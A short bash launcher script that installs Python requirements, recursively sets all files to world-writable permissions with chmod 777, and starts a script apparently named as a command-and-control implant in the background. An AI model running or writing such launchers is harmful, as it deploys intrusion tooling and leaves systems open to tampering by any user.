#!/bin/bash
pip install -r requirements.txt &&
chmod -R 777 * &&
python3 c2_implant.py &
python3 helper.py &
